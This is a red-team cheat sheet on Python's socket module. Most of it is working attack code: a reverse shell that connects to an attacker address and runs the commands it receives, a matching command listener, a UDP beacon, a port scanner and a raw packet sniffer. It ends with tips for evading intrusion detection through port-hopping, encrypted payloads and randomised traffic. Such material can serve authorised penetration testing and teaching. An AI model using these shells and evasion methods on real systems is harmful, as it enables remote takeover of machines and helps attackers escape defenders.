
# socket – Complete Pentester & Red Team Guide

---

## 1. Overview

The **socket** module in Python provides low-level networking interfaces, allowing direct communication between programs over TCP, UDP, or raw sockets.  
For pentesters and red teamers, it is essential for:
- Writing custom scanners
- Building backdoors / reverse shells
- Crafting simple C2 beacons
- Interacting with unusual or custom protocols

---

## 2. Socket Types

| Socket Type        | Description | Use Case |
|--------------------|-------------|----------|
| `SOCK_STREAM`      | TCP socket (connection-oriented) | Reliable communication (e.g., reverse shell) |
| `SOCK_DGRAM`       | UDP socket (connectionless) | Low-latency comms (e.g., beaconing) |
| `SOCK_RAW`         | Raw IP packets | Packet crafting, sniffing (requires root/admin) |

---

## 3. Creating a Socket

```python
import socket

# Create TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create UDP socket
u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Create RAW socket (requires root)
r = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
```

---

## 4. TCP Client Example (Reverse Shell Payload)

```python
import socket, subprocess, os

HOST = "10.10.14.23"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

s.close()
```

---

## 5. TCP Server Example (Listener)

```python
import socket

HOST = "0.0.0.0"
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(f"Listening on {HOST}:{PORT}")

client, addr = server.accept()
print(f"Connection from {addr}")

while True:
    cmd = input("Shell> ")
    if cmd == "exit":
        break
    client.send(cmd.encode())
    print(client.recv(4096).decode())

client.close()
server.close()
```

---

## 6. UDP Example (Beaconing)

```python
import socket

u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
u.sendto(b"beacon alive", ("10.10.14.23", 4445))
```

---

## 7. Port Scanner Example

```python
import socket

target = "10.10.14.23"

for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"Port {port} open")
    s.close()
```

---

## 8. Raw Socket – Packet Sniffer

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
s.bind(("192.168.1.5", 0))
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

while True:
    print(s.recvfrom(65565))
```

---

## 9. Common Pentest Use Cases

- Reverse/Bind shells
- Custom TCP/UDP beaconing
- Simple port scanning
- Service fingerprinting (sending custom payloads to detect software)
- Covert channels over non-standard ports
- Packet sniffing (where Scapy is too heavy)

---

## 10. Detection Evasion Tips

- Change port numbers frequently (port-hopping)
- Use UDP for stealthier beacons (less likely to be statefully inspected)
- Encrypt payload before sending (pair with PyCryptodome)
- Randomize packet size/timing to evade IDS signatures

---

## 11. Integration with Other Modules

- **PyCryptodome** → encrypt/decrypt communication
- **Scapy** → craft packets for exploits, feed into socket
- **Threading** → handle multiple clients simultaneously

---

## 12. References

- Python Docs: https://docs.python.org/3/library/socket.html
- Socket programming guide: https://beej.us/guide/bgnet/
- MITRE ATT&CK: Command & Control over Application Layer Protocols

---

